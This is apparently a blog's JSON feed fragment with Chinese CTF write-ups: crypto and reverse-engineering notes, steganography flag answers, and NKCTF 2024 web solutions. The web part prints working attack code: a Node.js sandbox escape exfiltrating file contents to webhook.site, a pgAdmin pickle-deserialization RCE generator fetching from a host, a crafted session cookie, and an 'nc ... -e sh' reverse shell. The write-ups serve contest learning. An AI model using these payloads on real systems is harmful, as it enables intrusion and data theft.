style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">∗</span><span class=\"mord\">2</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">t</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">n</span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord mathnormal\">p</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">2</span><span class=\"mclose\">)</span><span class=\"mopen\">[</span><span class=\"mord\">0</span><span class=\"mclose\">]</span></span></span></span></span></p>\n<p>然后分析</p>\n<p>while True 的条件</p>\n<p>这里其实就是判断是否满足</p>\n<p>z (p-1)/2 ≡ -1 (mod p)</p>\n<p>z (q-1)/2 ≡ -1 (mod q)</p>\n<p>从这里我们可以判断 z 既不是模 p 下的二次剩余，也不是模 q 下的二次剩余。紧接着，它把 flag 转换成二进制然后换成十进制，又对十进制数每位逐位加密。即十进制数的每一位都是 0 或 1，加密方式如下，把每一个十进制位记作 mi 有：</p>\n<p>cipheri = secreti ** 2 * zmi (mod n) 再结合之前的 p, q =&gt;</p>\n<p>cipheri = secreti ** 2 * zmi (mod p) 和 cipheri = secreti ** 2 * zmi (mod q)</p>\n<p>我们设此时 mi = 0 或 1 时，对应的 cipheri 分别是：</p>\n<p>cipheri = secreti ** 2 (mod p) 和 cipheri = secreti ** 2 (mod q)</p>\n<p>cipheri = secreti ** 2 * z (mod p) 和 cipheri = secreti ** 2 * z (mod q)</p>\n<p>又因为 z 不是模 p 或 q 下的二次剩余，所以当 mi = 0 或 1 时，我们可以用欧拉判别式来判断 cipheri 是不是二次剩余，以此来还原每一位 mi：</p>\n<p>cipheri (p-1)/2 ≡ 1 (mod p) 或 cipheri (q-1)/2 ≡ 1 (mod q)</p>\n<h3 id=\"江枫渔火对愁眠\"><a class=\"anchor\" href=\"#江枫渔火对愁眠\">#</a> 江枫渔火对愁眠</h3>\n<p><img data-src=\"https://s2.loli.net/2024/04/21/5dYkhWExgDHNMU3.png\" alt=\"image-20240421202143481\" /></p>\n<h3 id=\"crypto签到\"><a class=\"anchor\" href=\"#crypto签到\">#</a> crypto 签到</h3>\n<p>知道 p 直接整除 N 后就是正常 rsa 解密</p>\n<h2 id=\"reserverse\"><a class=\"anchor\" href=\"#reserverse\">#</a> Reserverse</h2>\n<h3 id=\"reverse-签到\"><a class=\"anchor\" href=\"#reverse-签到\">#</a> Reverse - 签到</h3>\n<p>爆破</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;14207171201067868421&#125;</span><br><span class=\"line\">flag&#123;14207171201367868421&#125;</span><br><span class=\"line\">flag&#123;14207171231367868421&#125;</span><br><span class=\"line\">flag&#123;14237171201067868421&#125;</span><br><span class=\"line\">flag&#123;14237171231067868421&#125;</span><br><span class=\"line\">flag&#123;14237171231367868421&#125;</span><br><span class=\"line\">flag&#123;14207171231067868421&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;14207171201067868429&#125;</span><br><span class=\"line\">flag&#123;14207171201367868429&#125;</span><br><span class=\"line\">flag&#123;14207171231367868429&#125;</span><br><span class=\"line\">flag&#123;14237171201067868429&#125;</span><br><span class=\"line\">flag&#123;14237171231067868429&#125;</span><br><span class=\"line\">flag&#123;14237171231367868429&#125;</span><br><span class=\"line\">flag&#123;14207171231067868429&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;14207171201067868429&#125;</span><br><span class=\"line\">flag&#123;14207171201367868429&#125;</span><br><span class=\"line\">flag&#123;14207171231367868429&#125;</span><br><span class=\"line\">flag&#123;14237171201067868429&#125;</span><br><span class=\"line\">flag&#123;14237171231067868429&#125;</span><br><span class=\"line\">flag&#123;14237171231367868429&#125;</span><br><span class=\"line\">flag&#123;14207171231067868429&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;14207171209067868429&#125;</span><br><span class=\"line\">flag&#123;14207171209367868429&#125;</span><br><span class=\"line\">flag&#123;14207171239367868429&#125;</span><br><span class=\"line\">flag&#123;14237171209067868429&#125;</span><br><span class=\"line\">flag&#123;14237171239067868429&#125;</span><br><span class=\"line\">flag&#123;14237171239367868429&#125;</span><br><span class=\"line\">flag&#123;14207171239067868429&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;14207179209067868429&#125;</span><br><span class=\"line\">flag&#123;14207179209367868429&#125;</span><br><span class=\"line\">flag&#123;14207179239367868429&#125;</span><br><span class=\"line\">flag&#123;14237179209067868429&#125;</span><br><span class=\"line\">flag&#123;14237179239067868429&#125;</span><br><span class=\"line\">flag&#123;14237179239367868429&#125;</span><br><span class=\"line\">flag&#123;14207179239067868429&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;14207979209067868429&#125;</span><br><span class=\"line\">flag&#123;14207979209367868429&#125;</span><br><span class=\"line\">flag&#123;14207979239367868429&#125;</span><br><span class=\"line\">flag&#123;14237979209067868429&#125;</span><br><span class=\"line\">flag&#123;14237979239067868429&#125;</span><br><span class=\"line\">flag&#123;14237979239367868429&#125;</span><br><span class=\"line\">flag&#123;14207979239067868429&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;94207979209067868429&#125;</span><br><span class=\"line\">flag&#123;94207979209367868429&#125;</span><br><span class=\"line\">flag&#123;94207979239367868429&#125;</span><br><span class=\"line\">flag&#123;94237979209067868429&#125;</span><br><span class=\"line\">flag&#123;94237979239067868429&#125;</span><br><span class=\"line\">flag&#123;94237979239367868429&#125;</span><br><span class=\"line\">flag&#123;94207979239067868429&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag&#123;94207979209067868421&#125;</span><br><span class=\"line\">flag&#123;94207979209367868421&#125;</span><br><span class=\"line\">flag&#123;94207979239367868421&#125;</span><br><span class=\"line\">flag&#123;94237979209067868421&#125;</span><br><span class=\"line\">flag&#123;94237979239067868421&#125;</span><br><span class=\"line\">flag&#123;94237979239367868421&#125;</span><br><span class=\"line\">flag&#123;94207979239067868421&#125;</span><br></pre></td></tr></table></figure></p>\n<p>里面其中一个就是</p>\n<p>因为</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">9-&gt;6</span><br><span class=\"line\">1-&gt;6</span><br><span class=\"line\">3-&gt;0</span><br><span class=\"line\">0-&gt;0</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"auth-system\"><a class=\"anchor\" href=\"#auth-system\">#</a> Auth System</h3>\n<p>直接改 zf 标志为绕过跳转指令</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/hOAfCIt91BMqjmx.jpg\" alt=\"img\" /></p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> misc</h2>\n<h3 id=\"f-misc-签到\"><a class=\"anchor\" href=\"#f-misc-签到\">#</a> F | Misc - 签到 |</h3>\n<p>十进制转字符得到公众号</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/nypholfTS9IRc1C.png\" alt=\"Snipaste_2024-04-19_11-40-55\" /></p>\n<p>公众号回复得到 flag</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/6fB3dj1J9ZNMHaL.png\" alt=\"Snipaste_2024-04-19_11-43-43\" /></p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/d5vnzuC8gGjQbXl.png\" alt=\"Snipaste_2024-04-19_11-44-33\" /></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;TreJaiuLT1rgbdfG0Eay&#125;</span><br></pre></td></tr></table></figure></p>\n<hr />\n<h3 id=\"f-fm-1458\"><a class=\"anchor\" href=\"#f-fm-1458\">#</a> F | FM 145.8 |</h3>\n<p>无线电隐写，得到 flag</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/QoplI3ZTGwijk4y.png\" alt=\"Snipaste_2024-04-19_11-20-26\" /></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;19b4dD77bF3c66f91c23F5A25Bc314CB&#125;</span><br></pre></td></tr></table></figure></p>\n<hr />\n<h3 id=\"f-ez_misc\"><a class=\"anchor\" href=\"#f-ez_misc\">#</a> F | ez_misc |</h3>\n<p>伪加密解压得到 flag.rar 和 ctf.jpg。打开图片发现末尾有 snow 隐写</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/5HL4MfRSehxkmKF.png\" alt=\"Snipaste_2024-04-21_22-26-08\" /></p>\n<p>snow 隐写解密得到压缩包密码</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/ZbNOQk4JjfW9XKI.png\" alt=\"Snipaste_2024-04-21_22-27-36\" /></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Carefree and carefree</span><br></pre></td></tr></table></figure></p>\n<p>解压得到 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;b220116fc6ca827ecf3cb6c6c06dac26&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"江\"><a class=\"anchor\" href=\"#江\">#</a> 江</h3>\n<p>就先找到橙色出租车定位武汉然后再百度地图搜索金店然后打开做对比<br />\n就找到了</p>\n",
            "tags": [
                "比赛"
            ]
        },
        {
            "id": "https://lookhui.github.io/NKCTF%202024/",
            "url": "https://lookhui.github.io/NKCTF%202024/",
            "title": "NKCTF",
            "date_published": "2024-03-25T01:26:11.000Z",
            "content_html": "<h2 id=\"nkctf-2024\"><a class=\"anchor\" href=\"#nkctf-2024\">#</a> NKCTF 2024</h2>\n<h3 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> web</h3>\n<h4 id=\"my-first-cms\"><a class=\"anchor\" href=\"#my-first-cms\">#</a> my first cms</h4>\n<p>爆破密码进去直接命令执行得到 flag</p>\n<p><img data-src=\"https://s2.loli.net/2024/04/26/KycNRPwgl7VuXT3.png\" alt=\"image-20240324155515773\" /></p>\n<p>参考链接</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://github.com/capture0x/CMSMadeSimple2</span><br><span class=\"line\">https://github.com/capture0x/CMSMadeSimple</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"全世界最简单的ctf\"><a class=\"anchor\" href=\"#全世界最简单的ctf\">#</a> 全世界最简单的 CTF</h4>\n<p>使用 nodejs 的 fs 模块可以读取文件，我猜测文件位置是 app/app.js 查看到源码</p>\n<p>然后使用语句</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">throw new Proxy(&#123;&#125;, &#123;</span><br><span class=\"line\">    get: function() &#123;</span><br><span class=\"line\">      const cc = arguments.callee.caller;</span><br><span class=\"line\">      const gg = (cc.constructor.constructor(`return $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;`))();</span><br><span class=\"line\">      const fs = gg.mainModule.require(&#x27;fs&#x27;).readFileSync(&#x27;/app/app.js&#x27;);</span><br><span class=\"line\">      const p = (cc.constructor.constructor(&#x27;return fetch&#x27;))();</span><br><span class=\"line\">      return p(&quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: `$&#123;fs&#125;`&#125;)&#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure></p>\n<p>即可读取到 app/app.js</p>\n<p>他源码并没有过滤掉 fork 我们正好可以利用</p>\n<p>最终脚本</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 文件写入suceess</span><br><span class=\"line\">throw new Proxy(&#123;&#125;, &#123;</span><br><span class=\"line\">    get: function() &#123;</span><br><span class=\"line\">      const cc = arguments.callee.caller;</span><br><span class=\"line\">      const gg = (cc.constructor.constructor(`return $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;`))();</span><br><span class=\"line\">let content = `</span><br><span class=\"line\">        let cs = require(&#x27;$&#123;`$&#123;&#x27;child_p&#x27;&#125;rocess&#x27;).exe`&#125;cSync(&#x27;/readflag&#x27;).toString();</span><br><span class=\"line\">        $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;.on(&quot;message&quot;,function(msg)&#123;</span><br><span class=\"line\">            fetch(&quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: cs&#125;)&#125;);</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">      `;</span><br><span class=\"line\">      const fs = gg.mainModule.require(&#x27;fs&#x27;).appendFileSync(&quot;./readflag1.js&quot;,content);</span><br><span class=\"line\">      const p = (cc.constructor.constructor(&#x27;return fetch&#x27;))();</span><br><span class=\"line\">      return p(&quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: `$&#123;fs&#125;`&#125;)&#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">//通信成功</span><br><span class=\"line\">throw new Proxy(&#123;&#125;, &#123;</span><br><span class=\"line\">    get: function() &#123;</span><br><span class=\"line\">      const cc = arguments.callee.caller;</span><br><span class=\"line\">      const g = (cc.constructor.constructor(`return $&#123;`$&#123;&#x27;proces&#x27;&#125;s`&#125;`))();</span><br><span class=\"line\">      const h = g.mainModule.require(`$&#123;&#x27;child_p&#x27;&#125;rocess`).fork(&#x27;./readflag1.js&#x27;);</span><br><span class=\"line\">      h.send(&#x27;hello&#x27;);</span><br><span class=\"line\">      const p = (cc.constructor.constructor(&#x27;return fetch&#x27;))();</span><br><span class=\"line\">      return p(&quot;https://webhook.site/8asd9-3eb1-4b42-adef-09fc03f43cca&quot;, &#123;method: &quot;POST&quot;, body: JSON.stringify(&#123;data: `$&#123;h&#125;`&#125;)&#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure></p>\n<p>注意过滤即可</p>\n<h4 id=\"attack_tacooooo\"><a class=\"anchor\" href=\"#attack_tacooooo\">#</a> attack_tacooooo</h4>\n<p>参考链接</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/</span><br></pre></td></tr></table></figure></p>\n<p>脚本如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import struct</span><br><span class=\"line\">import sys</span><br><span class=\"line\"></span><br><span class=\"line\">def produce_pickle_bytes(platform, cmd):</span><br><span class=\"line\">    b = b&#x27;\\x80\\x04\\x95&#x27;</span><br><span class=\"line\">    b += struct.pack(&#x27;L&#x27;, 22 + len(platform) + len(cmd))</span><br><span class=\"line\">    b += b&#x27;\\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(platform)) + platform.encode()</span><br><span class=\"line\">    b += b&#x27;\\x94\\x8c\\x06system\\x94\\x93\\x94&#x27;</span><br><span class=\"line\">    b += b&#x27;\\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(cmd)) + cmd.encode()</span><br><span class=\"line\">    b += b&#x27;\\x94\\x85\\x94R\\x94.&#x27;</span><br><span class=\"line\">    print(b)</span><br><span class=\"line\">    return b</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    if len(sys.argv) != 2:</span><br><span class=\"line\">        exit(f&quot;usage: &#123;sys.argv[0]&#125; ip:port&quot;)</span><br><span class=\"line\">    with open(&#x27;nt.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class=\"line\">        f.write(produce_pickle_bytes(&#x27;nt&#x27;, f&quot;mshta.exe http://&#123;HOST&#125;/&quot;))</span><br><span class=\"line\">    with open(&#x27;posix.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class=\"line\">        f.write(produce_pickle_bytes(&#x27;posix&#x27;, f&quot;curl http://&#123;HOST&#125;/&quot;))</span><br></pre></td></tr></table></figure></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1zbWJzZXJ2ZXItdTc1bm9vczg3dms0NGYucHk=\">还有一个 smbserver.py</span></p>\n<p>首先要知道这个漏洞是因为 join 去合并拼接产生</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">此函数有两个缺点：</span><br><span class=\"line\"></span><br><span class=\"line\">它没有设置不应转义的受信任基路径，因此返回 。os.path.join(&quot;/opt/safe/&quot;, &quot;../../etc/passwd&quot;)/etc/passwd</span><br><span class=\"line\">它在其参数中使用最右边的绝对路径作为根路径，因此返回 。os.path.join(&quot;./safe/&quot;, &quot;do_not_escape_from_here&quot;, &quot;/etc/passwd&quot;)/etc/passwd</span><br></pre></td></tr></table></figure></p>\n<p>比赛题目环境是由 docker 容器搭建</p>\n<p>环境内无 curl 以及 bash</p>\n<p>但是有 nc 可以利用 nc 来达到反弹 shell</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc 8.137.131.159 9006 -e sh</span><br></pre></td></tr></table></figure></p>\n<p>并且下面是需要利用</p>\n<p>pga4_session 来构造反序列化</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /browser/ HTTP/1.1</span><br><span class=\"line\">Host: 7d4eaaa6-c6d5-487e-a1d4-65986d6adb85.node.nkctf.yuzhian.com.cn</span><br><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\">Referer: http://7d4eaaa6-c6d5-487e-a1d4-65986d6adb85.node.nkctf.yuzhian.com.cn/login?next=%2F</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: pga4_session=../storage/tacooooo_qq.com/posix.pickle!baeac19e-2dcc-4d96-a4c7-1ff410ddd8c2!AZleysLS+ZnrL20IU1mGt6lHxXc3O8/It0JHyC4sJqA=; PGADMIN_LANGUAGE=en</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure></p>\n<p>构造如上，路径无所谓</p>\n<p>公网 ip 监听端口即可</p>\n",
            "tags": [
                "比赛"
            ]
        }
    ]
}